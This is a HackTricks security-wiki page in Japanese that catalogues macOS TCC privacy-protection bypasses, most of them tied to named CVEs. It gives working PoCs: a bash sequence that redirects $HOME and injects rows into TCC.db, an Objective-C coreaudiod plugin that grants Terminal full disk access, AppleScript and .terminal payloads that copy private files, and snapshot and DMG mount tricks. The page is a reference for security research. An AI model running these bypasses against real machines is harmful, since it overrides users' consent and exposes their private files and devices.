# macOS TCC バイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 機能別

### 書き込みバイパス

これはバイパスではなく、TCCの動作方法です：**書き込みを保護しません**。ターミナルがユーザーのデスクトップを読み取る権限がなくても、**書き込むことはできます**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
新しい**ファイル**には、**作成者のアプリ**が読み取りアクセスを持つために、**拡張属性`com.apple.macl`**が追加されます。

### SSHバイパス

デフォルトでは、**SSH**経由でのアクセスは**「フルディスクアクセス」**を持っています。これを無効にするには、リストに表示されているが無効になっている必要があります（リストから削除してもこれらの特権は削除されません）：

![](<../../../../.gitbook/assets/image (569).png>)

ここでは、いくつかの**マルウェアがこの保護をバイパス**する方法の例を見つけることができます：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
SSHを有効にするには、現在は**フルディスクアクセス**が必要です
{% endhint %}

### 拡張子の処理 - CVE-2022-26767

ファイルには、**特定のアプリケーションが読み取り権限を持つための`com.apple.macl`**属性が付与されます。この属性は、ファイルをアプリに**ドラッグ＆ドロップ**するか、ユーザがファイルを**ダブルクリック**してデフォルトのアプリで開くときに設定されます。

したがって、ユーザは**悪意のあるアプリ**を登録して、すべての拡張子を処理し、Launch Servicesを呼び出して任意のファイルを**開く**ことができます（したがって、悪意のあるファイルは読み取りアクセスが許可されます）。

### iCloud

権限**`com.apple.private.icloud-account-access`**を持つことで、**`com.apple.iCloudHelper`** XPCサービスと通信することができ、iCloudトークンを提供します。

**iMovie**と**Garageband**にはこの権限と他の権限がありました。

その権限からiCloudトークンを取得するためのエクスプロイトについての詳細については、次のトークを参照してください：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`**権限を持つアプリは、他のアプリを**制御することができます**。これは、他のアプリに付与された権限を悪用することができる可能性があることを意味します。

Appleスクリプトについての詳細は次を参照してください：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

たとえば、アプリが**`iTerm`に対してAutomation権限**を持っている場合、この例では**`Terminal`**がiTermにアクセス権を持っています：

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm上で

FDAを持たないTerminalは、それを持つiTermを呼び出して、それを使用してアクションを実行できます：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finderを介して

または、アプリがFinderを介してアクセスできる場合、次のようなスクリプトを使用することができます：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## アプリの振る舞いによるバイパス

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの**tccdデーモン**は、TCCユーザーデータベースにアクセスするために**`HOME`**環境変数を使用しています。データベースの場所は**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**です。

[このStack Exchangeの投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、TCCデーモンは現在のユーザーのドメイン内で`launchd`を介して実行されているため、それに渡される**すべての環境変数を制御することが可能**です。\
したがって、**攻撃者は`launchctl`**で**`$HOME`環境変数**を**制御されたディレクトリ**を指すように設定し、**TCC**デーモンを**再起動**し、その後、エンドユーザーにプロンプトを表示せずに**TCCデータベースを直接変更**して、**利用可能なすべてのTCC権限を自分自身に与える**ことができます。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - ノート

ノートはTCCで保護された場所にアクセスできますが、ノートが作成されると、これは**保護されていない場所に作成されます**。したがって、ノートに保護されたファイルをコピーするようにノートに依頼し、その後ファイルにアクセスすることができます：

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-XXXX - トランスロケーション

ライブラリ`libsecurity_translocate`を使用したバイナリ`/usr/libexec/lsd`は、`com.apple.private.nullfs_allow`というエンタイトルメントを持っており、これにより**nullfs**マウントを作成でき、`com.apple.private.tcc.allow`というエンタイトルメントを持っており、**`kTCCServiceSystemPolicyAllFiles`**ですべてのファイルにアクセスできます。

"Library"に検疫属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すことで、Libraryを**`$TMPDIR/AppTranslocation/d/d/Library`**にマッピングし、Library内のすべてのドキュメントに**アクセス**することができました。

### SQLトレース

環境変数**`SQLITE_AUTO_TRACE`**が設定されている場合、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリを**ログ**に記録し始めます。多くのアプリケーションがこのライブラリを使用しているため、すべてのSQLiteクエリをログに記録することができました。

いくつかのAppleアプリケーションは、TCCで保護された情報にアクセスするためにこのライブラリを使用していました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

rootとしてこのサービスを有効にすると、**ARDエージェントはフルディスクアクセス**を持つことができ、ユーザーが新しい**TCCユーザーデータベースをコピー**するために悪用することができます。

## プラグインによるバイパス

プラグインは通常、ライブラリやplist形式の追加コードであり、**メインアプリケーションによってロード**され、そのコンテキストで実行されます。したがって、メインアプリケーションがTCCの制限されたファイルにアクセスできる場合（許可された権限やエンタイトルメントを介して）、**カスタムコードもそれを持つ**ことになります。

### CVE-2020-27937 - Directory Utility

アプリケーション`/System/Library/CoreServices/Applications/Directory Utility.app`は、エンタイトルメント**`kTCCServiceSystemPolicySysAdminFiles`**を持ち、**`.daplug`**拡張子のプラグインをロードし、**ハード化されていなかった**ランタイムを持っていました。

このCVEを悪用するために、**`NFSHomeDirectory`**が**変更**され（前のエンタイトルメントを悪用）、TCCをバイパスするためにユーザーのTCCデータベースを**乗っ取る**ことができます。

詳細については、[**元のレポート**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を参照してください。

### CVE-2020-29621 - Coreaudiod

バイナリ**`/usr/sbin/coreaudiod`**は、エンタイトルメント`com.apple.security.cs.disable-library-validation`と`com.apple.private.tcc.manager`を持っていました。最初のエンタイトルメントは**コードインジェクションを許可**し、2番目のエンタイトルメントは**TCCの管理権限を与え**ます。

このバイナリは、フォルダー`/Library/Audio/Plug-Ins/HAL`から**サードパーティのプラグインをロード**することができました。したがって、このPoCを使用して**プラグインをロードし、TCCの権限を悪用**することが可能でした。
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**元のレポート**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)を参照してください。

### デバイス抽象化レイヤー（DAL）プラグイン

Core Media I/Oを介してカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`**を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`にあるこれらのプラグインをプロセス内にロードします（SIP制限はありません）。

一般的な**コンストラクタ**を持つライブラリをそこに保存するだけで、コードを**インジェクト**することができます。

これにより、いくつかのAppleのアプリケーションが脆弱になりました。

## プロセスインジェクションによる方法

プロセス内にコードをインジェクトし、そのTCC特権を悪用するためのさまざまな技術があります：

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

### Firefox

Firefoxアプリケーションは、`com.apple.security.cs.disable-library-validation`の権限を持っているため、まだ脆弱です：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
詳細については、[**元のレポートをチェックしてください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には、**`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の権限があり、プロセス内にコードを注入して TCC 権限を使用することができました。

### CVE-2023-26818 - Telegram

Telegram には、`com.apple.security.cs.allow-dyld-environment-variables` と `com.apple.security.cs.disable-library-validation` の権限があり、カメラでの録画などの権限にアクセスすることができました。[**writeup でペイロードを見つけることができます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

## オープンな呼び出しによる方法

サンドボックス化された状態で open を呼び出すことができます。

### ターミナルスクリプト

ターミナルには、**Full Disk Access (FDA)** を与えることが一般的です。少なくとも、テック系の人々が使用するコンピュータではそうです。そして、それを使用して **`.terminal`** スクリプトを呼び出すことができます。

**`.terminal`** スクリプトは、次のようなコマンドを **`CommandString`** キーで実行する plist ファイルです：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmpなどの場所にターミナルスクリプトを書き込み、次のようなコマンドで起動することができます：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる

### CVE-2020-9771 - mount\_apfs TCC バイパスと特権エスカレーション

**どのユーザーでも**（特権を持たないユーザーでも）タイムマシンのスナップショットを作成し、マウントすることができ、そのスナップショットの**すべてのファイルにアクセス**することができます。\
必要なのは、使用されるアプリケーション（例：`Terminal`）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つための**特権**のみであり、これは管理者によって許可される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)にあります。

### CVE-2021-1784 & CVE-2021-30808 - TCCファイルの上書き

TCC DBファイルが保護されていても、新しいTCC.dbファイルをディレクトリに**上書きする**ことが可能でした：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**オリジナルの解説記事**で**完全なエクスプロイト**を確認してください。

### asr

ツール**`/usr/sbin/asr`**は、TCCの保護をバイパスして、ディスク全体をコピーして別の場所にマウントすることができました。

### 位置情報サービス

**`/var/db/locationd/clients.plist`**には、**位置情報サービスにアクセスを許可されたクライアント**を示す第3のTCCデータベースがあります。\
フォルダ**`/var/db/locationd/`はDMGのマウントから保護されていなかった**ため、独自のplistをマウントすることが可能でした。

## スタートアップアプリによる方法

{% content-ref url="../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grepによる方法

いくつかの場合、ファイルには電子メール、電話番号、メッセージなどの機密情報が保護されていない場所に保存されることがあります（これはAppleの脆弱性と見なされます）。

<figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
